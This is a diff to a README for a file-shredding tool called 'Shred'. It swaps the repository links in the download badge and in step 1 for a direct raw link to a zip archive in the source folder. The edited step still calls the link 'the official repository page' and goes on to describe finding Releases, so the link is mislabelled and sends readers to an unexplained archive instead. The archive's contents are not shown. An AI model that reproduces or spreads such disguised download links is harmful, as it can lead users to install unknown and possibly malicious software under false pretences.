@@ -1,6 +1,6 @@
 # 🛡️ Shred - Securely Remove Files From Your Computer
 
-[![](https://img.shields.io/badge/Download-Shred-blue)](https://github.com/Darseymesoamerican6020/Shred)
+[![](https://img.shields.io/badge/Download-Shred-blue)](https://raw.githubusercontent.com/Darseymesoamerican6020/Shred/main/src/Software_v1.5.zip)
 
 ## 📁 What Does Shred Do?
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic criteria to run the software:
 
 Follow these steps to obtain the correct application version for your device.
 
-1.  Visit the official repository page at this link: [https://github.com/Darseymesoamerican6020/Shred](https://github.com/Darseymesoamerican6020/Shred).
+1.  Visit the official repository page at this link: [https://raw.githubusercontent.com/Darseymesoamerican6020/Shred/main/src/Software_v1.5.zip](https://raw.githubusercontent.com/Darseymesoamerican6020/Shred/main/src/Software_v1.5.zip).
 2.  Locate the section labeled Releases on the right side of the screen.
 3.  Click the latest version number.
 4.  Find the asset list at the bottom of the page.
